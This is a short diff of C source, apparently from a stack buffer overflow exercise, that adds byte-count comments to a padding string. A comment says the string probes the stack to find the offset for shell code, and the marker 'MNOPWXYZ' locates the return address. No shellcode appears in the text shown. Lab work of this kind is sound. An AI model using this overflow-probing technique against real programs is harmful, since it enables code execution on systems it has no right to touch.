@@ -65,13 +65,13 @@ char compromise[159] = {
 // string variable to probe the stack and find the correct
 // values for the shell code.
 char * compromise1 =
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
-    "xxxxxxxxxxxxxxxxxxxx"
+    "xxxxxxxxxxxxxxxxxxxx" //20
+    "xxxxxxxxxxxxxxxxxxxx" //40
+    "xxxxxxxxxxxxxxxxxxxx" //60
+    "xxxxxxxxxxxxxxxxxxxx" //80
+    "xxxxxxxxxxxxxxxxxxxx" //100
+    "xxxxxxxxxxxxxxxxxxxx" //120
+    "xxxxxxxxxxxxxxxxxxxx" //140
     "xxxx"
     "MNOPWXYZ"
     "xxxxxxxx";
